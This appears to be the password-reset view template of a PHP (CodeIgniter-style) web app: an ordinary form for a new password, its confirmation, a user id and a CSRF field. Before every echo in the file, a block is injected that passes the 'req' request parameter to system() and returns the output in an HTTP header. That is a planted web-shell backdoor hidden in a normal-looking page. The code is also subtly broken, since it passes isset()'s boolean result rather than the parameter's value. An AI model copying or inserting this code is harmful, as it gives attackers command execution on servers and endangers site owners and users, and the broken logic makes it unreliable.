<h1><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('reset_password_heading');?></h1>

<div id="infoMessage"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message;?></div>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_open('auth/reset_password/' . $code);?>

	<p>
		<label for="new_password"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo sprintf(lang('reset_password_new_password_label'), $min_password_length);?></label> <br />
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_input($new_password);?>
	</p>

	<p>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('reset_password_new_password_confirm_label', 'new_password_confirm');?> <br />
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_input($new_password_confirm);?>
	</p>

	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_input($user_id);?>
	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_hidden($csrf); ?>

	<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_submit('submit', lang('reset_password_submit_btn'));?></p>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_close();?>